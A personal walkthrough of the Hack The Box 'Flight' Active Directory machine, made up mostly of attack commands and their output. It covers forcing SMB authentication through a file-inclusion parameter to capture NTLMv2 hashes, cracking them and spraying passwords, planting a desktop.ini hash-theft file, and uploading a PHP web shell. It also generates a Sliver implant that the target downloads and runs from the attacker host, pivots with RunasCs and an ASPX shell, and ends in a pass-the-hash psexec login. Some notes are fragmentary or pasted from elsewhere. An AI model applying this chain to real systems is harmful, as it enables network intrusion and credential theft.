
https://www.hackthebox.com/achievement/machine/1777380/510


Windows -Active Directory · Hard

IP =10.10.11.187

_clock-skew: 6h59m59s for `'kerbrousting'`  

black-filed IP = `10.10.11.187`
my `ip = 10.10.14.8`

## enumeration
```bash
┌──(pwn㉿kali)-[~/flight]
└─$ sudo nmap -sC -sV -T4 10.10.11.187
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: g0 Aviation
|_http-server-header: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-05-10 22:38:55Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: flight.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: flight.htb0., Site: D

```
as always start by editing you /etc/hosts file by adding the domain name flight.htb with  the Ip

Port 593/tcp – `ncacn_http` ??
This is **Microsoft's RPC over HTTP** service, typically used for **DCOM (Distributed Component Object Model)** or **Outlook Anywhere**.

- **`ncacn_http`** is a **Network Computing Architecture Connection-Oriented (NCA CO) over HTTP** — a protocol string used by Microsoft's DCE/RPC mechanism.
    
- It's part of the **MSRPC stack** and allows RPC communication to go over HTTP, often seen on **Exchange Servers**, **Domain Controllers**, or **COM+ services**.
Used by **Outlook Anywhere**, **WinRM**, and **some AD services** to tunnel RPC traffic through firewalls over HTTP.

-check http port 80 - its flight airlines website
-path
	run directory busters
	run virtual hosts - sub-domain enum 
	
```bash
┌──(pwn㉿kali)-[~/flight]
└─$ ffuf -u http://10.10.11.187 -H "Host: FUZZ.flight.htb" -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs 7069

-fs for filtering size 

found:
school                  [Status: 200, Size: 3996, Words: 1045, Lines: 91, Duration: 90ms]
:: Progress: [4989/4989] :: Job [1/1] :: 168 req/sec :: Duration: [0:00:22] :: Errors: 0 ::

```
- add school t /etc/hosts school.flight.htb
- try to do zone transfer because its a domain controller
```bash
┌──(pwn㉿kali)-[~/flight]
└─$ dig axfr @10.10.11.187 school.flight.htb 

; <<>> DiG 9.20.8-6-Debian <<>> axfr @10.10.11.187 school.flight.htb
; (1 server found)
;; global options: +cmd
; Transfer failed.
                                                                                                   
┌──(pwn㉿kali)-[~/flight]
└─$ dig axfr @10.10.11.187 flight.htb 

; <<>> DiG 9.20.8-6-Debian <<>> axfr @10.10.11.187 flight.htb
; (1 server found)
;; global options: +cmd
; Transfer failed.

```

```bash
http://school.flight.htb/index.php?view=home.html 


?view=home.html ??? local-file inclusione path ? or remote 



```
Two common readable files that are available on most back-end servers are `/etc/passwd` on Linux and `C:\Windows\boot.ini` on Windows.

```bash
http://school.flight.htb/index.php?view=C:\Windows\boot.ini
```
Suspicious Activity Blocked! ??? maybe its WAF !!
```bash
view-source:http://school.flight.htb/index.php?view=index.php 

check source code ?

```

```php
<?php if (!isset($_GET['view']) || $_GET['view'] == "home.html") { ?>
    <div id="tagline">
      <div>
        <h4>Cum Sociis Nat PENATIBUS</h4>
        <p>Aenean leo nunc, fringilla a viverra sit amet, varius quis magna. Nunc vel mollis purus.</p>
      </div>
    </div>
<?php } ?>
  </div>
<?php

ini_set('display_errors', 0);
error_reporting(E_ERROR | E_WARNING | E_PARSE); 

if(isset($_GET['view'])){
$file=$_GET['view'];
if ((strpos(urldecode($_GET['view']),'..')!==false)||
    (strpos(urldecode(strtolower($_GET['view'])),'filter')!==false)||
    (strpos(urldecode($_GET['view']),'\\')!==false)||
    (strpos(urldecode($_GET['view']),'htaccess')!==false)||
    (strpos(urldecode($_GET['view']),'.shtml')!==false)
){
    echo "<h1>Suspicious Activity Blocked!";
    echo "<h3>Incident will be reported</h3>\r\n";
}else{
    echo file_get_contents($_GET['view']);	
}
}else{
    echo file_get_contents("C:\\xampp\\htdocs\\school.flight.htb\\home.html");
}
	
?>
```

lets set up netcat listener on port 445 (samba on our attack machine )
then we route trafic via burpsuits to try to auth to our smb listener share 
```bash
GET /index.php?view=//10.10.14.8/ahmad/file.txt HTTP/1.1

Host: school.flight.htb

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate, br

Connection: keep-alive

Upgrade-Insecure-Requests: 1

Priority: u=0, i



-----------------

┌──(pwn㉿kali)-[~/flight]
└─$ sudo nc -nlvp 445
listening on [any] 445 ...
connect to [10.10.14.8] from (UNKNOWN) [10.10.11.187] 49841
E�SMBr▒S�����"NT LM 0.12SMB 2.002SMB 2.???


what ever the user who run the system that the web server on it , we can try to run responder to capture the hash of it? because its windows ?


```

```bash
┌──(pwn㉿kali)-[~/flight]
└─$ sudo responder -I tun0

```

```bash
[SMB] NTLMv2-SSP Hash     : svc_apache::flight:3824107ea392689d:867E936937FC45FBF10E916BDFEAA3C7:01010000000000008085F09DC7C1DB01593A2CCADE8553770000000002000800310039004200510001001E00570049004E002D004D00420044005700570049004A00530033003000520004003400570049004E002D004D00420044005700570049004A0053003300300052002E0031003900420051002E004C004F00430041004C000300140031003900420051002E004C004F00430041004C000500140031003900420051002E004C004F00430041004C00070008008085F09DC7C1DB01060004000200000008003000300000000000000000000000003000002EAC7F62EF8BED40C1D4CF7706CD25B566CC481EF69CA6A4D38CC5C62151A7D30A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310034002E0038000000000000000000
```

```bash
1000 = NTLM  
5500 = NetNTLMv1-VANILLA / NetNTLMv1-ESS  
5600 = NetNTLMv2
```

```bash
┌──(pwn㉿kali)-[~/flight]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt ntlm_hash.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status

S@Ss!K@*t13      (svc_apache)     

```
`S@Ss!K@*t13`   `svc_apache`
```bash
┌──(pwn㉿kali)-[~/flight]
└─$ nxc smb 10.10.11.187 -u "svc_apache" -p 'S@Ss!K@*t13' --shares
SMB         10.10.11.187    445    G0               [*] Windows 10 / Server 2019 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.187    445    G0               [+] flight.htb\svc_apache:S@Ss!K@*t13 
SMB         10.10.11.187    445    G0               [*] Enumerated shares
SMB         10.10.11.187    445    G0               Share           Permissions     Remark
SMB         10.10.11.187    445    G0               -----           -----------     ------
SMB         10.10.11.187    445    G0               ADMIN$                          Remote Admin
SMB         10.10.11.187    445    G0               C$                              Default share
SMB         10.10.11.187    445    G0               IPC$            READ            Remote IPC
SMB         10.10.11.187    445    G0               NETLOGON        READ            Logon server share                                                                                                
SMB         10.10.11.187    445    G0               Shared          READ            
SMB         10.10.11.187    445    G0               SYSVOL          READ            Logon server share                                                                                                
SMB         10.10.11.187    445    G0               Users           READ            
SMB         10.10.11.187    445    G0               Web             READ            

```
web share might have .conf file ? 
```bash
┌──(pwn㉿kali)-[~/flight]
└─$ smbclient -U 'svc_apache' -p 'S@Ss!K@*t13' //10.10.11.187/Users
Password for [WORKGROUP\svc_apache]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                  DR        0  Thu Sep 22 20:16:56 2022
  ..                                 DR        0  Thu Sep 22 20:16:56 2022
  .NET v4.5                           D        0  Thu Sep 22 19:28:03 2022
  .NET v4.5 Classic                   D        0  Thu Sep 22 19:28:02 2022
  Administrator                       D        0  Mon Oct 31 18:34:00 2022
  All Users                       DHSrn        0  Sat Sep 15 07:28:48 2018
  C.Bum                               D        0  Thu Sep 22 20:08:23 2022
  Default                           DHR        0  Tue Jul 20 19:20:24 2021
  Default User                    DHSrn        0  Sat Sep 15 07:28:48 2018
  desktop.ini                       AHS      174  Sat Sep 15 07:16:48 2018
  Public                             DR        0  Tue Jul 20 19:23:25 2021
  svc_apache                          D        0  Fri Oct 21 18:50:21 2022

```

```bash
┌──(pwn㉿kali)-[~/flight]
└─$ nxc smb 10.10.11.187 -u "svc_apache" -p 'S@Ss!K@*t13' --users  
SMB         10.10.11.187    445    G0               [*] Windows 10 / Server 2019 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.187    445    G0               [+] flight.htb\svc_apache:S@Ss!K@*t13 
SMB         10.10.11.187    445    G0               -Username-                    -Last PW Set-       -BadPW- -Description-                                                                           
SMB         10.10.11.187    445    G0               Administrator                 2022-09-22 20:17:02 0       Built-in account for administering the computer/domain                                  
SMB         10.10.11.187    445    G0               Guest                         <never>             0       Built-in account for guest access to the computer/domain                                
SMB         10.10.11.187    445    G0               krbtgt                        2022-09-22 19:48:01 0       Key Distribution Center Service Account                                                 
SMB         10.10.11.187    445    G0               S.Moon                        2022-09-22 20:08:22 0       Junion Web Developer                                                                    
SMB         10.10.11.187    445    G0               R.Cold                        2022-09-22 20:08:22 0       HR Assistant                                                                            
SMB         10.10.11.187    445    G0               G.Lors                        2022-09-22 20:08:22 0       Sales manager                                                                           
SMB         10.10.11.187    445    G0               L.Kein                        2022-09-22 20:08:22 0       Penetration tester                                                                      
SMB         10.10.11.187    445    G0               M.Gold                        2022-09-22 20:08:22 0       Sysadmin                                                                                
SMB         10.10.11.187    445    G0               C.Bum                         2022-09-22 20:08:22 0       Senior Web Developer                                                                    
SMB         10.10.11.187    445    G0               W.Walker                      2022-09-22 20:08:22 0       Payroll officer                                                                         
SMB         10.10.11.187    445    G0               I.Francis                     2022-09-22 20:08:22 0       Nobody knows why he's here                                                              
SMB         10.10.11.187    445    G0               D.Truff                       2022-09-22 20:08:22 0       Project Manager                                                                         
SMB         10.10.11.187    445    G0               V.Stevens                     2022-09-22 20:08:22 0       Secretary                                                                               
SMB         10.10.11.187    445    G0               svc_apache                    2022-09-22 20:08:23 0       Service Apache web                                                                      
SMB         10.10.11.187    445    G0               O.Possum                      2022-09-22 20:08:23 0       Helpdesk                                                                                                        
SMB         10.10.11.187    445    G0               [*] Enumerated 15 local users: flight

```
- we get a list of users

-sometimes service account password is the same as some in domain user like the web server admin , developer , some manger ??
its good practice to spray password for service accounts

-we can check for cred validation using crack map exec  "netexec"

```bash
┌──(pwn㉿kali)-[~/flight]
└─$ nxc smb 10.10.11.187 -u users  -p 'S@Ss!K@*t13' --continue-on-success
SMB         10.10.11.187    445    G0               [*] Windows 10 / Server 2019 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.187    445    G0               [-] flight.htb\O.Possum:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.10.11.187    445    G0               [+] flight.htb\svc_apache:S@Ss!K@*t13 
SMB         10.10.11.187    445    G0               [-] flight.htb\V.Stevens:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.10.11.187    445    G0               [-] flight.htb\D.Truff:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.10.11.187    445    G0               [-] flight.htb\I.Francis:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.10.11.187    445    G0               [-] flight.htb\W.Walker:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.10.11.187    445    G0               [-] flight.htb\C.Bum:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.10.11.187    445    G0               [-] flight.htb\M.Gold:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.10.11.187    445    G0               [-] flight.htb\L.Kein:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.10.11.187    445    G0               [-] flight.htb\G.Lors:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.10.11.187    445    G0               [-] flight.htb\R.Cold:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.10.11.187    445    G0               [+] flight.htb\S.Moon:S@Ss!K@*t13 
SMB         10.10.11.187    445    G0               [-] flight.htb\krbtgt:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.10.11.187    445    G0               [-] flight.htb\Guest:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.10.11.187    445    G0               [-] flight.htb\Administrator:S@Ss!K@*t13 STATUS_LOGON_FAILURE
SMB         10.10.11.187    445    G0               [-] flight.htb\:S@Ss!K@*t13 STATUS_LOGON_FAILURE 

```

S.Moon  <> S@Ss!K@*t13
S.Moon                        2022-09-22 20:08:22 0       Junion Web Developer


## pre-exploitation

```bash
┌──(pwn㉿kali)-[~/flight]
└─$ nxc smb 10.10.11.187 -u 'S.Moon'  -p 'S@Ss!K@*t13' --shares             
SMB         10.10.11.187    445    G0               [*] Windows 10 / Server 2019 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.187    445    G0               [+] flight.htb\S.Moon:S@Ss!K@*t13 
SMB         10.10.11.187    445    G0               [*] Enumerated shares
SMB         10.10.11.187    445    G0               Share           Permissions     Remark
SMB         10.10.11.187    445    G0               -----           -----------     ------
SMB         10.10.11.187    445    G0               ADMIN$                          Remote Admin
SMB         10.10.11.187    445    G0               C$                              Default share
SMB         10.10.11.187    445    G0               IPC$            READ            Remote IPC
SMB         10.10.11.187    445    G0               NETLOGON        READ            Logon server share 
SMB         10.10.11.187    445    G0               Shared          READ,WRITE      
SMB         10.10.11.187    445    G0               SYSVOL          READ            Logon server share 
SMB         10.10.11.187    445    G0               Users           READ            
SMB         10.10.11.187    445    G0               Web             READ            

```
- we have read and write on shared ?
- Certain files can be used to steal the NTLMv2 hash of the users that access the share

Real-World Examples
Malicious `.lnk` (Shortcut) File:
>  A shortcut file pointing to `\\attacker-ip\share\file.txt` will cause **Windows Explorer** to try to **authenticate to the SMB share**, sending the NTLMv2 hash automatically.
```bash
\\10.10.14.5\share\icon.ico
```
Malicious Documents:
Office files (Word, Excel, etc.) can be crafted to **load a remote image or template** from `\\attacker-ip\share`, triggering the same behavior.

https://github.com/Greenwolf/ntlm_theft
A tool for generating multiple types of NTLMv2 hash theft files.

ntlm_theft is an Open Source Python3 Tool that generates 21 different types of hash theft documents. These can be used for phishing when either the target allows smb traffic outside their network, or if you are already inside the internal network.

The benefits of these file types over say macro based documents or exploit documents are that all of these are built using "intended functionality". None were flagged by Windows Defender Antivirus on June 2020, and 17 of the 21 attacks worked on a fully patched Windows 10 host.

```bash
┌──(pwn㉿kali)-[~/ntlm_theft]
└─$ sudo python3 ntlm_theft.py -g all -s 10.10.14.8 -f /home/pwn/flight/theft              
```

```bash
┌──(pwn㉿kali)-[~/flight/theft]
└─$ ls           
Autorun.inf  desktop.ini  zoom-attack-instructions.txt
                                                                                                   
┌──(pwn㉿kali)-[~/flight/theft]
└─$ smbclient -U 'S.Moon' -p 'S@Ss!K@*t13' //10.10.11.187/shared
Password for [WORKGROUP\S.Moon]:
Try "help" to get a list of possible commands.
smb: \> put desktop.ini
putting file desktop.ini as \desktop.ini (0.2 kb/s) (average 0.2 kb/s)

```

```bash
┌──(pwn㉿kali)-[~/flight/theft]
└─$ sudo responder -I tun0                                                   
```

```bash
──(pwn㉿kali)-[~/flight/theft]
└─$ cat desktop.ini 
[.ShellClassInfo]
IconResource=\\10.10.14.8\aa                                                                       
```

```bash
[SMB] NTLMv2-SSP Hash     : 

c.bum::flight.htb:0a6111919cab57af:E4D247F3A21E0EA25DFCF248B7FC5517:010100000000000080D7B197CEC1DB010B7EB74BCF30A7AE0000000002000800480048003800310001001E00570049004E002D005900320055004D00410036004B00380041004400360004003400570049004E002D005900320055004D00410036004B0038004100440036002E0048004800380031002E004C004F00430041004C000300140048004800380031002E004C004F00430041004C000500140048004800380031002E004C004F00430041004C000700080080D7B197CEC1DB01060004000200000008003000300000000000000000000000003000002EAC7F62EF8BED40C1D4CF7706CD25B566CC481EF69CA6A4D38CC5C62151A7D30A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310034002E0038000000000000000000

```

c.bum <> Senior Web Developer
what if he can write on web-server ? so we can write reversre-shell , then trigger it ?

-crack hashes
-check smb permission of shares

```bash
┌──(pwn㉿kali)-[~/flight]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt c_hash.txt   


Tikkycoll_431012284 (c.bum)     

```

```bash
┌──(pwn㉿kali)-[~/flight]
└─$ nxc smb 10.10.11.187 -u 'c.bum'  -p 'Tikkycoll_431012284' --shares
SMB         10.10.11.187    445    G0               [*] Windows 10 / Server 2019 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.187    445    G0               [+] flight.htb\c.bum:Tikkycoll_431012284 
SMB         10.10.11.187    445    G0               [*] Enumerated shares
SMB         10.10.11.187    445    G0               Share           Permissions     Remark
SMB         10.10.11.187    445    G0               -----           -----------     ------
SMB         10.10.11.187    445    G0               ADMIN$                          Remote Admin
SMB         10.10.11.187    445    G0               C$                              Default share
SMB         10.10.11.187    445    G0               IPC$            READ            Remote IPC
SMB         10.10.11.187    445    G0               NETLOGON        READ            Logon server share                                                                                                
SMB         10.10.11.187    445    G0               Shared          READ,WRITE      
SMB         10.10.11.187    445    G0               SYSVOL          READ            Logon server share                                                                                                
SMB         10.10.11.187    445    G0               Users           READ            
SMB         10.10.11.187    445    G0               Web             READ,WRITE      

```

```php

<?p##p echo system($_GET['c']); ?>

```

```bash
┌──(pwn㉿kali)-[~/flight]
└─$ smbclient -U 'c.bum' -p 'Tikkycoll_431012284' //10.10.11.187/Web
Password for [WORKGROUP\c.bum]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Sun May 11 00:20:01 2025
  ..                                  D        0  Sun May 11 00:20:01 2025
  flight.htb                          D        0  Sun May 11 00:17:01 2025

```
```bash
smb: \flight.htb\> put shell.php 
putting file shell.php as \flight.htb\shell.php (0.1 kb/s) (average 0.1 kb/s)
smb: \flight.htb\> 

```

```bash
┌──(pwn㉿kali)-[~/flight]
└─$ curl 'http://flight.htb/shell.php?c=whoami'
flight\svc_apache
flight\svc_apache                                                                                                   

```

but before that lets grab the flag
```bash
smb: \C.Bum\desktop\> dir
  .                                  DR        0  Thu Sep 22 20:17:02 2022
  ..                                 DR        0  Thu Sep 22 20:17:02 2022
  user.txt                       AR       34  Sat May 10 22:37:12 2025

                5056511 blocks of size 4096. 1250175 blocks available
smb: \C.Bum\desktop\> get user.txt 

```


## post-exploitation

A **C2 (Command and Control)** is a **server** that attackers (or red teamers) use to **control compromised machines** remotely.

An **implant** is a **small program (payload)** that runs on the target computer and connects back to the attacker's C2.

**Sliver** is an **open-source C2 framework** like Metasploit or Cobalt Strike but more modern and stealthy. It lets you:

- Generate implants (payloads)
    
- Receive connections from victims
    
- Run commands, spawn shells, download files, pivot, etc.
    

It’s built for **red teamers**, and it **obfuscates** implants (makes them harder for AV to detect).


```bash
sliver-server

┌──(pwn㉿kali)-[~]
└─$ sliver              
Connecting to localhost:31337 ...

    ███████╗██╗     ██╗██╗   ██╗███████╗██████╗                                                    
    ██╔════╝██║     ██║██║   ██║██╔════╝██╔══██╗                                                   
    ███████╗██║     ██║██║   ██║█████╗  ██████╔╝                                                   
    ╚════██║██║     ██║╚██╗ ██╔╝██╔══╝  ██╔══██╗                                                   
    ███████║███████╗██║ ╚████╔╝ ███████╗██║  ██║                                                   
    ╚══════╝╚══════╝╚═╝  ╚═══╝  ╚══════╝╚═╝  ╚═╝                                                   
                                                                                                   
All hackers gain miracle
[*] Server v1.5.43 - e116a5ec3d26e8582348a29cfd251f915ce4a405
[*] Welcome to the sliver shell, please type 'help' for options

[*] Check for updates with the 'update' command

sliver >  generate --os windows --arch 64bit --mtls 10.10.14.13 --reconnect 60 --save ahmad.exe 

mtls


generate --os windows --arch 64bit --mtls 10.10.14.8 --reconnect 60 --save htb.exe
mtls
```


**mTLS** stands for **Mutual TLS** (Mutual Transport Layer Security).
### Normal TLS:

- Only the **server** proves its identity (e.g., HTTPS websites).
    
- The **client trusts the server**.
    

### **Mutual TLS (mTLS)**:

- **Both client and server authenticate each other** using digital certificates.
    
- The **client proves its identity**, too.

`-save htb.exe`: Save the implant as `htb.exe`

```bash
PS -c "wget 10.10.14.13/ahmad.exe
-usebasiparsing -outfile C:\users\public\music\htb.exe; C:\users\public\music\ahmad.exe
```
encoded url:
```bash
```
download the file then execute it

```bash
┌──(pwn㉿kali)-[~]
└─$ sudo python3 -m http.server 80
[sudo] password for pwn: 
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

```

```bash
 ID         Transport   Remote Address       Hostname   Username            Operating System   Health  
========== =========== ==================== ========== =================== ================== =========
 10911bef   mtls        10.10.11.187:49827   g0         flight\svc_apache   windows/amd64      [ALIVE]                                                                                                

sliver > sessions -i 109

[*] Active session RADICAL_NORTH (10911bef)

sliver (RADICAL_NORTH) > whoami

Logon ID: flight\svc_apache
[*] Current Token ID: flight\svc_apache
sliver (RADICAL_NORTH) > 
```
am user c.bym senior web admin , but my shell is as svc_apache
i can use runas because i have credentials
```bash
/opt/SharpCollection/NetFramework_4.7_Any/_RunasCs.exe
.\_RunasCs.exe c.bum Tikkycoll_431012284 -l 2 "C:\users\public\music\ahmad.exe"
```
.\_RunasCs.exe c.bum Tikkycoll_431012284 -l 2 "C:\users\public\music\ahmad.exe"

```powershell
PS C:\xampp\htdocs\flight.htb> .\_RunasCs.exe c.bum Tikkycoll_431012284 -l 2 "C:\users\public\music\ahmad.exe"
```

```bash
sliver > sessions 

 ID         Transport   Remote Address       Hostname   Username            Operating System   Health  
========== =========== ==================== ========== =================== ================== =========
 10911bef   mtls        10.10.11.187:49827   g0         flight\svc_apache   windows/amd64      [ALIVE]                                                                                                
 fd2c2f7d   mtls        10.10.11.187:49897   g0         flight\C.Bum        windows/amd64      [ALIVE]                                                                                                

sliver > sessions -i fd2c2f7d

[*] Active session RADICAL_NORTH (fd2c2f7d)

sliver (RADICAL_NORTH) > whoami

Logon ID: flight\C.Bum
[*] Current Token ID: flight\C.Bum
sliver (RADICAL_NORTH) >  

```

```bash
PS C:\> cd inetpub
cd inetpub
PS C:\inetpub> dir
dir


    Directory: C:\inetpub


Mode                LastWriteTime         Length Name                                              
----                -------------         ------ ----                                              
d-----        9/22/2022  12:24 PM                custerr                                           
d-----        5/13/2025   3:02 PM                development                                       
d-----        9/22/2022   1:08 PM                history                                           
d-----        9/22/2022  12:32 PM                logs                                              
d-----        9/22/2022  12:24 PM                temp                                              
d-----        9/22/2022  12:28 PM                wwwroot                                           


PS C:\inetpub> 

```
what is inetpub <> administrators running IIS will have seen it for years. It's **used to store the web server's script files, site content, and other bits and pieces**

i have trying a lot the path is discover open port in 8000  taht runs IIS web server 
so i upload .aspx shell and re executed ahmad.exe so i can get shell as the account who run this IIS server , 

>Now, we can trigger our sliver implant from our browser by visiting the following URL with our SOCKS proxy
enabled.
We get a new session as the "user" IIS APPPOOL\DefaultAppPool . This "user" is in fact a Microsoft Virtual
Account and according to Microsoft:
This means, that we can use Rubeus from our current session to request a ticket for ourselves (the machine
account) and perform a DCSync attack.
As a matter of fact, armory which comes along with sliver has a Rubeus module that will make our
exploitation a bit easier. First of all, we have to install the module.
Then, we can execute it on our current session as we would the binary itself.
http://127.0.0.1:8000/shell.aspx?c=C:\users\public\music\ahmad.exe
Services that run as virtual accounts access network resources by using the credentials
of the computer account in the format <domain_name>\<computer_name>$.


```bash
┌──(pwn㉿kali)-[/opt/SharpCollection/NetFramework_4.7_Any]
└─$ impacket-psexec Administrator@flight.htb -hashes aad3b435b51404eeaad3b435b51404ee:43bbfc530bab76141b12c8446e30c17c                                              
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on flight.htb.....
[*] Found writable share ADMIN$
[*] Uploading file UjTUDFsK.exe
[*] Opening SVCManager on flight.htb.....
[*] Creating service KAVH on flight.htb.....
[*] Starting service KAVH.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.2989]
(c) 2018 Microsoft Corporation. All rights reserved.

```

```bash
c:\Users\Administrator\Desktop> type root.txt
fa4cd**************cced7e

c:\Users\Administrator\Desktop> 

```
![[Pasted image 20250513181237.png]]
